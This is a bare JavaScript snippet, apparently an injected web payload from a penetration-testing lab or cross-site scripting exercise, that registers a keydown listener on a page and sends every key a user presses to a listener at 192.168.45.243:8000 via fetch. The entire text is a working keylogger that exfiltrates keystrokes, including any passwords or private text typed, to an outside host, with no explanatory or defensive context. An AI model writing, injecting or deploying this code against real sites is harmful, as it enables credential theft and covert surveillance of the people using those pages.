function logKey(event){
        fetch("http://192.168.45.243:8000/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
